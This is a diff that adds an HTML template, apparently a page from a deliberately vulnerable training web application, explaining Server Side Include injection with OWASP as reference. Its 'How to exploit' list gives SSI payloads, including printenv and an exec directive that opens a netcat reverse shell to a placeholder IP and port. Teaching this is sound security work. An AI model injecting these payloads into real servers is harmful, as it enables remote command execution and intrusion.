@@ -1,0 +1,96 @@
+{% extends 'vuln10.html' %} {% block body %}
+<style>
+  .content-container {
+    max-width: 800px;
+    margin: 0 auto;
+    padding: 20px;
+    overflow-y: auto;
+    max-height: 600px; /* Adjust as needed */
+  }
+
+  .scrollable {
+    overflow-y: auto;
+    max-height: 400px; /* Adjust as needed */
+  }
+
+  /* Additional styles for the SSI Injection section */
+  .content-container h2 {
+    margin-top: 20px;
+  }
+
+  .content-container pre {
+    background-color: #f8f8f8;
+    padding: 10px;
+    border-radius: 5px;
+    margin-bottom: 10px;
+  }
+
+  .content-container pre code {
+    font-family: Consolas, monospace;
+  }
+  .container {
+    width: 90%;
+    margin: auto;
+    padding: 20px;
+    background-color: #fff;
+    box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+    border-radius: 10px;
+    margin-top: 30px;
+  }
+  .scrollable-content {
+    height: 450px; /* Adjust the height as needed */
+    overflow-y: auto;
+    padding-right: 20px;
+  }
+</style>
+<div class="container">
+  <h1>Server Side Include Injection (SSI Injection)</h1>
+  <div class="scrollable-content">
+    <h2>Introduction</h2>
+    <p>
+      SSI (Server Side Includes) Injection is a type of web security
+      vulnerability that occurs when a web application allows untrusted
+      user-supplied data to be used as part of a Server Side Include (SSI)
+      directive.
+    </p>
+
+    <h2>Where to find</h2>
+    <p>
+      Usually it can be found anywhere. Just try to input the payload in the
+      form or GET parameter.
+    </p>
+
+    <h2>How to exploit</h2>
+    <div class="scrollable">
+      <ol>
+        <li>
+          <p>Print a date</p>
+          <pre><code>&lt;!--#echo var="DATE_LOCAL" --&gt;</code></pre>
+        </li>
+        <li>
+          <p>Print all the variables</p>
+          <pre><code>&lt;!--#printenv --&gt;</code></pre>
+        </li>
+        <li>
+          <p>Include a file</p>
+          <pre><code>&lt;!--#include file="includefile.html" --&gt;</code></pre>
+        </li>
+        <li>
+          <p>Doing a reverse shell</p>
+          <pre><code>&lt;!--#exec cmd="mkfifo /tmp/foo;nc IP PORT 0&lt;/tmp/foo|/bin/bash 1&gt;/tmp/foo;rm /tmp/foo" --&gt;</code></pre>
+        </li>
+      </ol>
+    </div>
+
+    <h2>References</h2>
+    <ul>
+      <li>
+        <a
+          href="https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection"
+          >OWASP</a
+        >
+      </li>
+    </ul>
+  </div>
+</div>
+{% endblock %}
